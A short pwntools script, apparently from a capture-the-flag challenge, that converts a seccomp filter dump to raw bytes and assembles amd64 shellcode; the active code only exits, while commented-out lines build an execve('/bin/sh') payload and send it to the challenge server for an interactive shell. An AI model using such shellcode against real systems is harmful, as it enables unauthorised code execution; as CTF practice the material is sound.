from pwn import *

def dump_to_raw():
    data = bytearray()
    for line in open('syscall_filter.dump').read().split('\n'):
        for b in line.split(' '):
            if b:
                data.append(int(b, 16))
    open('syscall_filter.raw', 'wb').write(data)

def gen_shellcode():
    context(arch='amd64', os='linux')

    code = []
#      code.append('mov rax, 0x3b')
#      code.append('lea rdi, [rip+9]')
#      code.append('lea rbx, [rip+10]')
#      code.append('jmp rbx')
#      code.append('.asciz "/bin/sh"')
#      code.append('syscall')
    code.append('mov rax, 0x3c')
    code.append('xor rdi, rdi')
    code.append('syscall')

    for c in code:
        print(asm(c).hex(), c)

    shellcode = asm('\n'.join(code))
    print(shellcode)
    open('shellcode', 'wb').write(shellcode)

    return shellcode

shellcode = gen_shellcode()
#  r = remote('securecheck.balsnctf.com', 54321)
#  r.send(shellcode)
#  r.interactive()
